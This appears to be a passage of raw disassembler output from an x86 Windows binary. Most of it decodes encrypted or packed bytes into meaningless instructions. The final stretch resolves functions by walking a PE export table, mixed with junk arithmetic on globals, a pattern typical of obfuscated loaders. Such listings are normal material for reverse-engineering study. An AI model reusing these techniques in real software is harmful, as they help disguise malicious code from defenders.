  404975:	mov    ecx,0xacc668ef
  40497a:	jle    0x4049b5
  40497c:	pop    es
  40497d:	pop    edi
  40497e:	cmp    BYTE PTR [esi+0x4d09f9bd],al
  404984:	push   0x68a4c630
  404989:	repnz fistp QWORD PTR [ecx]
  40498c:	xchg   BYTE PTR ds:0x1326d8b9,dh
  404992:	repnz sar BYTE PTR [ecx],cl
  404995:	jp     0x4049d0
  404997:	sbb    edi,edi
  404999:	cld    
  40499a:	cmp    bl,al
  40499c:	ror    BYTE PTR [edi],cl
  40499e:	loope  0x404a14
  4049a0:	cmp    ah,BYTE PTR [eax]
  4049a2:	xchg   ch,dh
  4049a4:	(bad)  
  4049a5:	popf   
  4049a6:	sub    al,0x9e
  4049a8:	aam    0x58
  4049aa:	sbb    eax,0x16e8c7b3
  4049af:	inc    eax
  4049b0:	lods   al,BYTE PTR ds:[esi]
  4049b1:	jns    0x404a0d
  4049b3:	sub    BYTE PTR [edi-0x19708f72],bl
  4049b9:	add    eax,0x41e5837b
  4049be:	int3   
  4049bf:	jl     0x40495a
  4049c1:	iret   
  4049c2:	shl    esp,cl
  4049c4:	test   eax,0x42b2167b
  4049c9:	ds dec edx
  4049cb:	cmp    DWORD PTR [esp+eax*4+0x41],ecx
  4049cf:	aas    
  4049d0:	pusha  
  4049d1:	test   eax,0x23e0e1eb
  4049d6:	rcr    BYTE PTR [ebx],1
  4049d8:	fcom   QWORD PTR [eax]
  4049da:	xor    al,BYTE PTR [eax+esi*1-0x5a]
  4049de:	xchg   esp,eax
  4049df:	sub    al,0xbb
  4049e1:	pop    edx
  4049e2:	xor    BYTE PTR [ebx+0x41],ah
  4049e5:	shl    eax,0x5c
  4049e8:	stc    
  4049e9:	pop    esp
  4049ea:	fistp  DWORD PTR [eax]
  4049ec:	ret    
  4049ed:	inc    esi
  4049ee:	and    dh,BYTE PTR [eax]
  4049f0:	cwde   
  4049f1:	pop    esp
  4049f2:	mov    eax,0x9d0f1b8d
  4049f7:	stc    
  4049f8:	mov    ds:0x8130f293,al
  4049fd:	in     eax,dx
  4049fe:	xchg   al,bl
  404a00:	jg     0x4049a9
  404a02:	pop    ss
  404a03:	sbb    BYTE PTR [ebp+0x17],0xf1
  404a07:	out    dx,al
  404a08:	pop    esp
  404a09:	mov    ch,BYTE PTR [edi+0xbd38f34]
  404a0f:	call   0xc14:0xdca642f9
  404a16:	sbb    al,0x4b
  404a18:	sbb    ebp,eax
  404a1a:	shl    BYTE PTR [edi+0xe],cl
  404a1d:	loop   0x4049b0
  404a1f:	iret   
  404a20:	adc    eax,edx
  404a22:	lods   eax,DWORD PTR ds:[esi]
  404a23:	nop
  404a24:	imul   edi,DWORD PTR [ebx-0x7666a8e5],0x730ab84a
  404a2e:	mov    ecx,0x2b033c07
  404a33:	xchg   ebp,eax
  404a34:	inc    eax
  404a35:	xlat   BYTE PTR ds:[ebx]
  404a36:	add    al,0x49
  404a38:	push   ss
  404a39:	xchg   edi,eax
  404a3a:	hlt    
  404a3b:	retf   
  404a3c:	mov    ah,0xad
  404a3e:	mov    WORD PTR [ecx],?
  404a40:	xor    al,0xbe
  404a42:	xor    eax,0xef37f5a5
  404a47:	jb     0x404a2f
  404a49:	outs   dx,DWORD PTR ds:[esi]
  404a4a:	jae    0x404a4a
  404a4c:	pop    edi
  404a4d:	and    eax,0x8c357e77
  404a52:	jp     0x404a16
  404a54:	push   ds
  404a55:	sub    DWORD PTR [ecx],edx
  404a57:	push   ecx
  404a58:	popa   
  404a59:	and    al,0x46
  404a5b:	outs   dx,BYTE PTR ds:[esi]
  404a5c:	mov    al,ds:0x86b64711
  404a61:	add    eax,0x174f964b
  404a66:	stc    
  404a67:	push   edx
  404a68:	icebp  
  404a69:	das    
  404a6a:	retf   0xe65b
  404a6d:	ins    DWORD PTR es:[edi],dx
  404a6e:	int    0xd1
  404a70:	adc    al,0x22
  404a72:	inc    esi
  404a73:	sub    dh,BYTE PTR [edi+0x1ad52ce2]
  404a79:	or     DWORD PTR [ecx],ebx
  404a7b:	loopne 0x404ae0
  404a7d:	jle    0x404ad7
  404a7f:	mov    bl,0x3b
  404a81:	mov    dh,0x64
  404a83:	je     0x404add
  404a85:	xchg   edi,eax
  404a86:	hlt    
  404a87:	mov    al,ds:0xbee3e8c
  404a8c:	imul   edx,DWORD PTR [ecx-0x1f934e9a],0xde9185c0
  404a96:	daa    
  404a97:	sub    DWORD PTR [ecx+ebx*1+0x77],ebx
  404a9b:	mov    dl,BYTE PTR [edi+eax*4+0x2a125eeb]
  404aa2:	pop    es
  404aa3:	sub    dl,0x42
  404aa6:	xchg   ebp,ecx
  404aa8:	je     0x404ade
  404aaa:	outs   dx,BYTE PTR ds:[esi]
  404aab:	test   al,0x4
  404aad:	test   BYTE PTR [esi+ebp*1+0x13],al
  404ab1:	es ret 
  404ab3:	test   al,0x83
  404ab5:	scas   al,BYTE PTR es:[edi]
  404ab6:	fild   QWORD PTR [eax]
  404ab8:	dec    esp
  404ab9:	mov    cl,0xbd
  404abb:	push   eax
  404abc:	mov    bl,0xa0
  404abe:	or     eax,0x815675e2
  404ac3:	sbb    esi,0xffffffa5
  404ac6:	cdq    
  404ac7:	jo     0x404a63
  404ac9:	jo     0x404acb
  404acb:	sub    BYTE PTR [edx],dl
  404acd:	sbb    BYTE PTR [edi],cl
  404acf:	rcr    BYTE PTR [edi-0x73a50d0a],cl
  404ad5:	fadd   QWORD PTR [ebx]
  404ad7:	jno    0x404ac0
  404ad9:	inc    ebx
  404ada:	pop    esi
  404adb:	aaa    
  404adc:	sbb    al,0xdb
  404ade:	mov    ebx,0x87ab80e5
  404ae3:	push   0xd482ed12
  404ae8:	lods   al,BYTE PTR ds:[esi]
  404ae9:	mov    bh,0xac
  404aeb:	and    eax,0xb96a9d4a
  404af0:	scas   al,BYTE PTR es:[edi]
  404af1:	fwait
  404af2:	pusha  
  404af3:	push   cs
  404af4:	mov    eax,DWORD PTR [ebp+0x1d]
  404af7:	gs push ss
  404af9:	dec    esp
  404afa:	sub    edx,edi
  404afc:	jb     0x404ae9
  404afe:	shl    DWORD PTR [ebx+0x50],cl
  404b01:	sub    BYTE PTR [eax],0x81
  404b04:	imul   esi,eax,0x69
  404b07:	mov    edx,0x3ef4a912
  404b0c:	clc    
  404b0d:	stc    
  404b0e:	cmp    cl,BYTE PTR [edi-0x222e0bb9]
  404b14:	jb     0x404b3d
  404b16:	push   0x91796f76
  404b1b:	ss jmp 0xbca4:0x107c9c26
  404b23:	fdiv   QWORD PTR [eax]
  404b25:	inc    esp
  404b26:	lds    ebx,FWORD PTR [edx-0x7d]
  404b29:	jg     0x404b3a
  404b2b:	inc    esi
  404b2c:	out    0x43,al
  404b2e:	xchg   esp,eax
  404b2f:	mov    al,ds:0xdaa8b96
  404b34:	inc    ebp
  404b35:	or     dh,BYTE PTR [esi+0x65]
  404b38:	(bad)  
  404b39:	in     al,dx
  404b3a:	pop    ebp
  404b3b:	mov    ch,0x62
  404b3d:	sar    BYTE PTR [ebp+0x8],1
  404b40:	(bad)  
  404b41:	mov    WORD PTR [ebx-0x5f],cs
  404b44:	popa   
  404b45:	and    al,BYTE PTR ds:0x30829b5a
  404b4b:	movzx  eax,BYTE PTR [eax]
  404b4e:	pop    ebp
  404b4f:	dec    ecx
  404b50:	xchg   ebx,eax
  404b51:	not    DWORD PTR [ecx+eiz*2+0x7]
  404b55:	mov    dl,0xb3
  404b57:	call   0x12ed970b
  404b5c:	adc    BYTE PTR [esi],ah
  404b5e:	mov    eax,?
  404b60:	in     eax,0x70
  404b62:	xchg   esp,eax
  404b63:	ins    BYTE PTR es:[edi],dx
  404b64:	cmp    BYTE PTR [edx-0x7f9db719],0x52
  404b6b:	mov    esi,0xd1f8c450
  404b70:	lods   al,BYTE PTR ds:[esi]
  404b71:	test   al,0xf7
  404b73:	imul   esi,DWORD PTR [ebx],0x75
  404b76:	push   ss
  404b77:	push   0xfa3e1a0f
  404b7c:	(bad)  
  404b7d:	gs xchg edi,eax
  404b7f:	aas    
  404b80:	xchg   esi,eax
  404b81:	push   eax
  404b82:	push   0xf05f83d6
  404b87:	lock arpl WORD PTR [edi+ebp*8+0x24],ax
  404b8c:	(bad)
  404b90:	lahf   
  404b91:	sub    BYTE PTR [esi-0x55c5bd3b],bh
  404b97:	fnstenv [ebx]
  404b99:	jp     0x404b22
  404b9b:	(bad)
  404b9f:	aas    
  404ba0:	xchg   edx,eax
  404ba1:	xchg   ecx,eax
  404ba2:	adc    eax,0x22192af4
  404ba7:	lods   al,BYTE PTR ds:[esi]
  404ba8:	aad    0x94
  404baa:	push   0xfffffff1
  404bac:	jl     0x404bc6
  404bae:	xchg   DWORD PTR [edx-0x443fe9fc],ecx
  404bb4:	sub    edx,DWORD PTR [ebx+0x56]
  404bb7:	retf   0xb0ac
  404bba:	ins    BYTE PTR es:[edi],dx
  404bbb:	dec    ebx
  404bbc:	xchg   esp,eax
  404bbd:	inc    ebx
  404bbe:	dec    ebp
  404bbf:	mov    BYTE PTR [ebp+eiz*8+0x76],ch
  404bc3:	das    
  404bc4:	(bad)  [esi+0x34]
  404bc7:	cld    
  404bc8:	sti    
  404bc9:	lods   al,BYTE PTR ds:[esi]
  404bca:	mov    bh,0x89
  404bcc:	mov    al,BYTE PTR [ebp+0x1afcf941]
  404bd2:	clc    
  404bd3:	pop    es
  404bd4:	push   cs
  404bd5:	inc    ebp
  404bd6:	stos   DWORD PTR es:[edi],eax
  404bd7:	push   esp
  404bd8:	sbb    BYTE PTR [edx],cl
  404bda:	test   eax,0xa0ed3084
  404bdf:	enter  0x74d9,0x25
  404be3:	adc    BYTE PTR [edi-0x7],ah
  404be6:	dec    esp
  404be7:	inc    edi
  404be8:	retf   0x12eb
  404beb:	xchg   ebx,ebp
  404bed:	mov    edi,0xe2928127
  404bf2:	arpl   WORD PTR [esi+edx*1],bp
  404bf5:	test   al,0x49
  404bf7:	out    dx,al
  404bf8:	push   esi
  404bf9:	fsubp  st(1),st
  404bfb:	cmp    al,dh
  404bfd:	fisub  WORD PTR [esi-0x3af65a3a]
  404c03:	leave  
  404c04:	or     BYTE PTR [ebx-0x16544a4c],ah
  404c0a:	popf   
  404c0b:	pop    esi
  404c0c:	test   eax,0x408d707
  404c11:	pop    ebx
  404c12:	pop    ss
  404c13:	loopne 0x404c76
  404c15:	push   edi
  404c16:	cmp    eax,0xa915ecfb
  404c1b:	mov    bl,0x3
  404c1d:	inc    esp
  404c1e:	js     0x404c2a
  404c20:	mov    eax,0x6ff0394b
  404c25:	add    ecx,esi
  404c27:	xor    al,0x3a
  404c29:	push   es
  404c2a:	ja     0x404c8b
  404c2c:	pop    edi
  404c2d:	(bad)  
  404c2e:	cmp    ecx,DWORD PTR [esi]
  404c30:	dec    ebp
  404c31:	sub    BYTE PTR [ebp+0x42],al
  404c34:	xor    dl,bh
  404c36:	(bad)  [eax-0x40c3e095]
  404c3c:	dec    edi
  404c3d:	in     eax,dx
  404c3e:	rcl    BYTE PTR [ecx-0x55],cl
  404c41:	icebp  
  404c42:	lods   eax,DWORD PTR ds:[esi]
  404c43:	(bad)  
  404c44:	(bad)  
  404c45:	stc    
  404c46:	fsub   DWORD PTR [esi]
  404c48:	inc    esp
  404c49:	hlt    
  404c4a:	bound  edx,QWORD PTR [edi+0x131e2633]
  404c50:	inc    edi
  404c51:	mov    cl,0xa
  404c53:	imul   ecx,DWORD PTR [edx+edi*1+0x119e6ad9],0x5f337f30
  404c5e:	inc    edx
  404c5f:	adc    ah,BYTE PTR [edx+0x5c]
  404c62:	nop
  404c63:	mov    edi,0x7783aab0
  404c68:	xchg   edx,eax
  404c69:	loop   0x404cd9
  404c6b:	pop    esp
  404c6c:	repz fistp WORD PTR [esi-0x5805de4d]
  404c73:	inc    ebp
  404c74:	idiv   DWORD PTR [ebp-0x6d]
  404c77:	mov    al,ds:0x40790d48
  404c7c:	imul   BYTE PTR [edx-0x2]
  404c7f:	push   cs
  404c80:	jp     0x404cac
  404c82:	(bad)
  404c85:	xor    eax,0x295b8cd2
  404c8a:	lods   eax,DWORD PTR ds:[esi]
  404c8b:	arpl   WORD PTR [ebx-0x3548df5e],cx
  404c91:	sbb    edx,edi
  404c93:	stos   BYTE PTR es:[edi],al
  404c94:	(bad)  
  404c97:	call   0x99641e7
  404c9c:	sub    DWORD PTR ds:0xa8f62155,eax
  404ca2:	xor    edi,eax
  404ca4:	shr    DWORD PTR [ebp-0xe372bba],cl
  404caa:	jae    0x404c6b
  404cac:	call   0xfb6dc6ac
  404cb1:	xchg   ecx,eax
  404cb2:	cmp    cl,BYTE PTR [esi+0x33d04750]
  404cb8:	cmc    
  404cb9:	push   ebx
  404cba:	ins    DWORD PTR es:[edi],dx
  404cbb:	or     ch,ah
  404cbd:	jbe    0x404ca3
  404cbf:	jmp    0x8c06f13e
  404cc4:	add    eax,0x2a3c781f
  404cc9:	or     DWORD PTR [edi-0x72834ffd],ecx
  404ccf:	xchg   ecx,eax
  404cd0:	fiadd  DWORD PTR gs:[edi-0x2a]
  404cd4:	loop   0x404d06
  404cd6:	xchg   edx,eax
  404cd7:	mov    ah,0x8b
  404cd9:	mov    bh,0xb2
  404cdb:	push   ds
  404cdc:	stc    
  404cdd:	or     al,cl
  404cdf:	cld    
  404ce0:	jmp    0x2a86:0xa1596a0a
  404ce7:	mov    bl,0xaa
  404ce9:	jge    0x404cc0
  404ceb:	lock (bad) 
  404cee:	mov    ebx,0x9662fe81
  404cf3:	das    
  404cf4:	or     eax,0x60d87182
  404cf9:	jno    0x404d79
  404cfb:	cld    
  404cfc:	test   ebp,ebp
  404cfe:	xchg   ebp,eax
  404cff:	out    dx,al
  404d00:	jg     0x404d34
  404d02:	pushf  
  404d03:	ja     0x404cac
  404d05:	dec    esi
  404d06:	mov    cl,0x20
  404d08:	add    BYTE PTR [ecx-0x49],bl
  404d0b:	dec    esi
  404d0c:	cmp    esi,DWORD PTR [ebp-0x78]
  404d0f:	loop   0x404d2a
  404d11:	icebp  
  404d12:	pop    edi
  404d13:	jg     0x404cc0
  404d15:	in     eax,0x1
  404d17:	fdiv   QWORD PTR [ecx+0x7a0eec28]
  404d1d:	aaa    
  404d1e:	(bad)  
  404d1f:	daa    
  404d20:	xor    al,0xd
  404d22:	xor    al,0x63
  404d24:	fld    DWORD PTR [eax+0x63]
  404d27:	fbld   TBYTE PTR [ecx-0x5f]
  404d2a:	cmp    DWORD PTR [edi-0x5f3a044d],edx
  404d30:	add    ebp,DWORD PTR [ecx+0x40df8b18]
  404d36:	pop    ecx
  404d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d38:	pop    es
  404d39:	mov    dh,0x43
  404d3b:	inc    edx
  404d3c:	in     eax,dx
  404d3d:	inc    esi
  404d3e:	in     eax,0xe
  404d40:	or     eax,0xed8cbb10
  404d45:	lds    eax,FWORD PTR [edx-0x4d]
  404d48:	out    0x9,al
  404d4a:	fisttp DWORD PTR [esp+esi*1]
  404d4d:	(bad)  
  404d4e:	cmp    DWORD PTR [edi],ebx
  404d50:	(bad)  
  404d52:	popf   
  404d53:	out    dx,al
  404d54:	outs   dx,BYTE PTR ds:[esi]
  404d55:	jmp    0x65ab43ea
  404d5a:	inc    esp
  404d5c:	push   esi
  404d5d:	call   0xf7f1:0xa269286
  404d64:	pop    ss
  404d65:	or     BYTE PTR [esi-0x2ac7db85],bh
  404d6b:	es (bad) 
  404d6d:	jb     0x404d79
  404d6f:	daa    
  404d70:	int    0xb5
  404d72:	and    DWORD PTR [edx+0x14],0x7d
  404d76:	fiadd  WORD PTR [esp+edi*2+0x48d800ae]
  404d7d:	sub    BYTE PTR [edi-0x7b],bh
  404d80:	scas   al,BYTE PTR es:[edi]
  404d81:	cmp    BYTE PTR [ebx-0x4d0bba3c],cl
  404d87:	(bad)  
  404d88:	xor    eax,0x3479c7ec
  404d8d:	fwait
  404d8e:	aaa    
  404d8f:	mov    al,0xa1
  404d91:	dec    ebx
  404d92:	aad    0x72
  404d94:	ins    DWORD PTR es:[edi],dx
  404d95:	fcomp  QWORD PTR [ecx-0x68]
  404d98:	clc    
  404d99:	xchg   edx,eax
  404d9a:	dec    esp
  404d9b:	inc    ebx
  404d9c:	out    0x36,eax
  404d9e:	(bad)  
  404d9f:	repz sub BYTE PTR [edi-0x1c],ch
  404da3:	push   ss
  404da4:	std    
  404da5:	inc    eax
  404da6:	mov    bh,0x9d
  404da8:	fst    QWORD PTR [edi]
  404daa:	push   0xbaf7fe1a
  404daf:	fwait
  404db0:	jne    0x404dd1
  404db2:	mov    ds:0x766eabd1,al
  404db7:	inc    eax
  404db8:	inc    edi
  404db9:	es pop es
  404dbb:	test   BYTE PTR [ecx-0x1d],dl
  404dbe:	adc    eax,0xfa241b1a
  404dc3:	nop
  404dc4:	leave  
  404dc5:	rcr    edx,0x47
  404dc8:	pop    ds
  404dc9:	push   ss
  404dca:	mov    ?,WORD PTR [ecx+0x2dfa9526]
  404dd0:	(bad)  
  404dd1:	sub    ecx,DWORD PTR [edx+0x8267f8]
  404dd7:	call   0x9884:0x4134da9b
  404dde:	adc    eax,0x35b737f0
  404de3:	jle    0x404de9
  404de5:	das    
  404de6:	mov    al,ds:0x1853cd92
  404deb:	push   ss
  404dec:	cmp    eax,0xf1f91a50
  404df1:	(bad)  [edi-0x64]
  404df4:	test   al,0x1e
  404df6:	(bad)  
  404df7:	stos   DWORD PTR es:[edi],eax
  404df8:	add    al,dh
  404dfa:	add    al,0x88
  404dfc:	xchg   ebx,eax
  404dfd:	jnp    0x404d88
  404dff:	popa   
  404e00:	xchg   ebx,eax
  404e01:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  404e03:	and    eax,0xe5aadc06
  404e08:	mov    ?,WORD PTR [eax]
  404e0a:	mov    BYTE PTR [ebx],0x1e
  404e0d:	mov    edi,0x3d6fd79e
  404e12:	shl    BYTE PTR [ebx],0x9c
  404e15:	aaa    
  404e16:	add    edx,DWORD PTR [eax]
  404e18:	out    0xb3,eax
  404e1a:	add    al,0xf9
  404e1c:	push   ss
  404e1d:	adc    BYTE PTR [edx-0x3777cc3d],al
  404e23:	aad    0x92
  404e25:	or     al,bh
  404e27:	out    dx,eax
  404e28:	and    BYTE PTR [ebx+0x3c54d62b],bl
  404e2e:	pop    ebp
  404e2f:	adc    eax,0x34
  404e32:	leave  
  404e33:	shl    DWORD PTR [eax+0x69e246b],1
  404e39:	xor    dl,BYTE PTR [edi]
  404e3b:	adc    eax,0x978f43b3
  404e40:	push   DWORD PTR [eax]
  404e42:	data16 or BYTE PTR [ebp+0x9],ch
  404e46:	xchg   ecx,eax
  404e47:	(bad)  
  404e48:	cmp    DWORD PTR [ecx+ebx*4-0x2a],edi
  404e4c:	fcom   QWORD PTR [edx+0x33]
  404e4f:	loopne 0x404e40
  404e51:	inc    eax
  404e52:	mov    dl,BYTE PTR [esi]
  404e54:	loop   0x404e8c
  404e56:	(bad)  
  404e57:	cmp    eax,0x2113dd10
  404e5c:	test   eax,0x7329dcd9
  404e61:	cmc    
  404e62:	loopne 0x404e4f
  404e64:	fs pop esp
  404e66:	or     BYTE PTR [ecx+0x54a78d30],bl
  404e6c:	aas    
  404e6d:	push   edi
  404e6e:	loope  0x404e79
  404e70:	mov    eax,0x4f24ce5d
  404e75:	fstp   DWORD PTR [eax]
  404e77:	xchg   ebp,eax
  404e78:	scas   al,BYTE PTR es:[edi]
  404e79:	xor    dl,BYTE PTR ss:[eax+ebx*1-0x2b4d35ae]
  404e81:	in     al,0x46
  404e83:	push   0xb45b38e
  404e88:	or     eax,0xce23804a
  404e8d:	int3   
  404e8e:	shl    DWORD PTR [edx-0x64],cl
  404e91:	fsub   QWORD PTR [edi+0x3f44989d]
  404e97:	xor    BYTE PTR [ebp+0x11cde33d],cl
  404e9d:	idiv   ebp
  404e9f:	fimul  DWORD PTR [edx+0x12db830f]
  404ea5:	dec    esi
  404ea6:	fdivr  QWORD PTR [edi]
  404ea8:	neg    BYTE PTR [ecx]
  404eaa:	leave  
  404eab:	sbb    al,0x1b
  404ead:	fnsave [ebp+0x7b]
  404eb0:	jno    0x404e4d
  404eb2:	push   ecx
  404eb3:	pop    ebx
  404eb4:	sbb    eax,0x87d83851
  404eb9:	retf   
  404eba:	popa   
  404ebb:	pop    edi
  404ebc:	pop    ss
  404ebd:	or     BYTE PTR [ebp+0x5010be53],cl
  404ec3:	and    eax,0xae393fe6
  404ec8:	pop    esi
  404ec9:	and    al,0x26
  404ecb:	daa    
  404ecc:	fdiv   DWORD PTR [esi+0x3f359c3b]
  404ed2:	or     ah,BYTE PTR ds:0xe3c84e56
  404ed8:	sub    edx,DWORD PTR [esi-0x45]
  404edb:	add    BYTE PTR [ebp+0x426f5a57],dh
  404ee1:	and    esi,DWORD PTR [edx]
  404ee3:	(bad)  [esi]
  404ee5:	mov    ss,ebp
  404ee7:	sbb    eax,0x3e90762f
  404eec:	pop    ds
  404eed:	iret   
  404eee:	rcl    esi,1
  404ef0:	inc    edi
  404ef1:	cwde   
  404ef2:	mov    ss,WORD PTR [esi]
  404ef4:	pop    edi
  404ef5:	or     eax,0xb4867ff6
  404efa:	xor    eax,0xea66683a
  404eff:	iret   
  404f00:	jg     0x404ecc
  404f02:	adc    BYTE PTR [esi+0x6cf9d1a1],al
  404f08:	into   
  404f09:	sbb    edi,DWORD PTR [esi+esi*2]
  404f0c:	cdq    
  404f0d:	ins    DWORD PTR es:[edi],dx
  404f0e:	add    dl,0x3c
  404f11:	test   edi,esi
  404f13:	jb     0x404f7e
  404f15:	sbb    esi,DWORD PTR [ebp+esi*4-0x58]
  404f19:	mov    eax,DWORD PTR [esi-0x375fdb96]
  404f1f:	imul   edx
  404f21:	scas   eax,DWORD PTR es:[edi]
  404f22:	enter  0x1664,0xe4
  404f26:	test   BYTE PTR [ecx-0x2dea2cc],ch
  404f2c:	push   0xffffff86
  404f2e:	inc    ecx
  404f2f:	or     eax,edx
  404f31:	and    DWORD PTR [esi+0x46fd33d3],0x8d427cdb
  404f3b:	jb     0x404f5e
  404f3d:	adc    ah,BYTE PTR [edi-0x185a4c35]
  404f43:	cmp    esp,DWORD PTR [eax-0x43517f79]
  404f49:	test   DWORD PTR [edx+0x2310930e],ebp
  404f4f:	test   BYTE PTR es:[eax+0x55],cl
  404f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f54:	mov    ds:0x3467edfc,eax
  404f59:	xchg   esp,eax
  404f5a:	jmp    0xb837:0xfe8c2ddf
  404f61:	sbb    BYTE PTR [ecx+0x6749c7c9],ah
  404f67:	dec    edi
  404f68:	repnz or dh,ch
  404f6b:	aas    
  404f6c:	jp     0x404fbc
  404f6e:	lods   eax,DWORD PTR ds:[esi]
  404f6f:	aad    0x8e
  404f71:	(bad)
  404f74:	dec    edx
  404f75:	jp     0x404fcf
  404f77:	scas   eax,DWORD PTR es:[edi]
  404f78:	int    0x42
  404f7a:	ja     0x404f4d
  404f7c:	and    eax,0x2c9ab7f3
  404f81:	jne    0x404f09
  404f83:	in     eax,0x4a
  404f85:	push   0x21
  404f87:	hlt    
  404f88:	in     al,0x3a
  404f8a:	xchg   BYTE PTR [ecx-0x2e],dl
  404f8d:	adc    dh,BYTE PTR [eiz*1+0x19fe9e46]
  404f94:	inc    ecx
  404f95:	pop    es
  404f96:	push   ss
  404f97:	adc    edx,esp
  404f99:	xchg   edi,eax
  404f9a:	inc    edi
  404f9b:	rol    esp,cl
  404f9d:	inc    eax
  404f9e:	adc    BYTE PTR [ebx-0x11],0xab
  404fa2:	fwait
  404fa3:	shl    BYTE PTR [eax],cl
  404fa5:	jp     0x404ffd
  404fa7:	mov    BYTE PTR [ecx],dl
  404fa9:	pop    esp
  404faa:	dec    ebp
  404fab:	aam    0x53
  404fad:	retf   
  404fae:	call   FWORD PTR [eax+0x79989d9f]
  404fb4:	bound  ebp,QWORD PTR [esi]
  404fb6:	jge    0x404f3b
  404fb8:	pop    edx
  404fb9:	pop    ss
  404fba:	push   ds
  404fbb:	imul   ebp,esi,0xffffffac
  404fbe:	push   esi
  404fbf:	xchg   edx,eax
  404fc0:	cmp    DWORD PTR [esi+edx*4+0x6a3ce919],ebp
  404fc7:	mov    ds:0x6e1adfcb,eax
  404fcc:	test   eax,esp
  404fce:	std    
  404fcf:	mov    edi,0x3bace9b2
  404fd4:	lods   al,BYTE PTR ds:[esi]
  404fd5:	xchg   esi,eax
  404fd6:	lea    ecx,[edx-0x2c]
  404fd9:	push   ebp
  404fda:	jl     0x404fe6
  404fdc:	in     al,0x11
  404fde:	fsub   st(5),st
  404fe0:	mov    ds:0x6fae2e88,al
  404fe5:	in     al,0xb2
  404fe7:	movd   DWORD PTR [ecx],mm5
  404fea:	ins    DWORD PTR es:[edi],dx
  404feb:	xchg   edi,eax
  404fec:	fst    DWORD PTR [esi+0x1d95bed9]
  404ff2:	sub    bh,BYTE PTR [esi+edi*2-0x30]
  404ff6:	bound  eax,QWORD PTR [ebp-0x8]
  404ff9:	mov    esp,0x88ef4246
  404ffe:	pop    ebp
  404fff:	add    bh,dl
  405001:	in     eax,0x70
  405003:	cdq    
  405004:	fnstsw WORD PTR [ebx-0x7b]
  405007:	sub    eax,0x6e481b2d
  40500c:	and    esp,DWORD PTR [eax-0x3630a4e]
  405012:	(bad)  
  405013:	cs dec ebp
  405015:	cli    
  405016:	in     eax,0xb1
  405018:	jbe    0x405016
  40501a:	cs jae 0x405033
  40501d:	gs jle 0x40505a
  405020:	jmp    0x9c64:0x7070409b
  405027:	addr16 push esi
  405029:	rol    BYTE PTR [ebp+0x48],1
  40502c:	sbb    BYTE PTR [edi+0x1b5d07f8],cl
  405032:	stos   BYTE PTR es:[edi],al
  405033:	ins    DWORD PTR es:[edi],dx
  405034:	or     al,0x99
  405036:	jmp    0x840f:0xc83b7f6a
  40503d:	dec    edx
  40503e:	add    al,BYTE PTR [eax]
  405040:	add    BYTE PTR [ecx+0x42b01805],al
  405046:	add    BYTE PTR [eax],cl
  405048:	rol    BYTE PTR [edx+0x0],0xff
  40504c:	jne    0x40503a
  40504e:	xor    DWORD PTR ds:0x42b00c,0x3dbe
  405058:	push   DWORD PTR [ebp+0x8]
  40505b:	call   0x40c78f
  405060:	sbb    ecx,0x6495
  405066:	mov    DWORD PTR [ebp-0x14],eax
  405069:	or     DWORD PTR ds:0x42901c,ebx
  40506f:	mov    eax,DWORD PTR [ebp-0x4]
  405072:	mov    ecx,DWORD PTR [ebp-0x14]
  405075:	adc    DWORD PTR ds:0x42d00c,0x15e5
  40507f:	xor    eax,esi
  405081:	add    eax,edi
  405083:	mov    DWORD PTR ds:0x42b004,0x7edf
  40508d:	cmp    ecx,eax
  40508f:	mov    DWORD PTR ds:0x42d014,0x1e10
  405099:	je     0x40528b
  40509f:	mov    eax,DWORD PTR [ebp-0x14]
  4050a2:	mov    ecx,DWORD PTR ds:0x429010
  4050a8:	sbb    DWORD PTR ds:0x42c00c,ecx
  4050ae:	mov    eax,DWORD PTR [eax+0x18]
  4050b1:	mov    DWORD PTR [ebp-0x2c],eax
  4050b4:	add    ecx,ecx
  4050b6:	mov    eax,DWORD PTR [ebp-0x14]
  4050b9:	sbb    DWORD PTR ds:0x42c01c,0x4c1
  4050c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4050c6:	xor    DWORD PTR ds:0x42b000,0x3fa3
  4050d0:	add    ecx,DWORD PTR [eax+0x20]
  4050d3:	xor    eax,0x40df
  4050d8:	mov    DWORD PTR [ebp-0x34],ecx
  4050db:	or     ecx,eax
  4050dd:	mov    eax,DWORD PTR [ebp-0x14]
  4050e0:	xor    DWORD PTR ds:0x429008,ecx
  4050e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4050e9:	and    DWORD PTR ds:0x42a008,0x42d014
  4050f3:	add    ecx,DWORD PTR [eax+0x24]
  4050f6:	mov    DWORD PTR [ebp-0x3c],ecx
  4050f9:	movzx  eax,BYTE PTR ds:0x42c000
  405100:	sbb    DWORD PTR ds:0x429010,eax
  405106:	mov    eax,DWORD PTR [ebp-0x14]
  405109:	mov    DWORD PTR ds:0x42d004,0x14
  405113:	cmp    DWORD PTR ds:0x42d004,0x0
  40511a:	je     0x405176
  405120:	cmp    DWORD PTR ds:0x42d004,0x9
  405127:	jne    0x405142
  40512d:	push   0x42e0f9
  405132:	push   0x42e0c7
  405137:	push   0x400000
  40513c:	call   DWORD PTR ds:0x42e9c7
  405142:	cmp    DWORD PTR ds:0x42d004,0xa
  405149:	jne    0x40515c
  40514f:	mov    ecx,DWORD PTR ds:0x42d004
  405155:	dec    ecx
  405156:	mov    DWORD PTR ds:0x42d004,ecx
  40515c:	xor    ecx,ecx
  40515e:	or     ecx,DWORD PTR ds:0x42d004
  405164:	dec    ecx
  405165:	mov    DWORD PTR ds:0x42d004,ecx
  40516b:	jmp    0x405113
  405170:	inc    DWORD PTR ds:0x42b00c
  405176:	mov    ecx,DWORD PTR [ebp+0x8]
  405179:	add    ecx,DWORD PTR [eax+0x1c]
  40517c:	mov    DWORD PTR [ebp-0x14],ecx
  40517f:	jmp    0x405253
  405184:	sub    DWORD PTR ds:0x42c018,ebx
  40518a:	mov    eax,DWORD PTR [ebp-0x34]
  40518d:	mov    ecx,DWORD PTR [ebp+0x8]
  405190:	sbb    DWORD PTR ds:0x42a014,0x429000
  40519a:	add    ecx,DWORD PTR [eax+ebx*4]
  40519d:	and    DWORD PTR ds:0x42d00c,0x0
  4051a7:	jmp    0x4051b7
  4051ac:	mov    eax,ds:0x42d00c
  4051b1:	inc    eax
  4051b2:	mov    ds:0x42d00c,eax
  4051b7:	cmp    DWORD PTR ds:0x42d00c,0x1b
  4051be:	jae    0x405206
  4051c4:	cmp    DWORD PTR ds:0x42d00c,0xd
